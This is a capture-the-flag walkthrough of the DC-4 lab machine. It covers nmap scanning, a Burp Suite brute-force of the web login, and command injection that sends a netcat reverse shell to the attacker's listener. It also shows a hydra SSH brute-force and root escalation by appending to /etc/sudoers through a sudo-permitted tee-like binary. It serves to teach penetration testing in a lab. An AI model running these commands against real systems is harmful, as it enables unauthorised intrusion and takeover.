# DC-4
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/1.png" >
</p>
Let’s start with scanning my local private network to get the adress IP of my target.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/netdiscover.png" >
</p>
the adress of my target => 10.0.4.20
Our next step is to scan our target with NMAP.
```
nmap -sC -sV -o scan.nmap 10.0.4.20
```
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/scan.png">
</p>
there is one port open: 80=> server APACHE et 22 => ssh.
Let's check the server Apache on port 80.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/1.png" >
</p>
Here is a login authentication, I tried first with **sqlmap** but no way to get logged in.So I tried brute forcing
with burp suite, we start first by intercepting the request after send it to Intruder.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/2.png" >
</p>
for all passwords trying I get the same code lenght, with **happy** password I get a different code. It is probably the right password 
for the admin account.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/3.png" >
</p>
Great, we logged in and there three options to execute some listed commands.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/4.png" >
</p>
So I edit the code source of the page and change the command "ls -al" to "nc 10.0.4.4 1234 -e /bin/bash". This command send a reverse
shell to my listener.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/6.png" >
</p>
That is working, I have a reverse shell and I logged in as a www-data user.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/7.png" >
</p>
I check the home directory for any useful information. Under the jim directory I find a list of his older passwords.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/8.png" >
</p>
I tried every password in the list with hydra through ssh login.Finally jibril04 is the correct password.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/9.png" >
</p>
I logged in with ssh with jim credentials. I check the home directory nothing useful,
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/10.png" >
</p>
So I read jim emails /var/mail/jim that is containing the charles password.
 <p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/11.png" >
</p>
I switch to charles user, and I run **sudo -l** and I found something valuable, /usr/bin/teehee command can be run as a root.
teehee command reads the standard input and writes it to both the standard output and one or more files.
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/12.png" >
</p>
So I changed the file /etc/sudoers to give charles priviledge to execute every command as root.I run /bin/bash as root.
```
echo "charles ALL=(ALL) ALL" |sudo /usr/bin/teehee /etc/sudoers
sudo su
```
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/DC-4/root_access.png" >
</p>
<p align="center">
  <img src="https://rajoul.github.io/my_write_up/image/gif/lhjar.gif" width="460" height="170">
</p>
support me on [twitter](https://twitter.com/rajoul6)











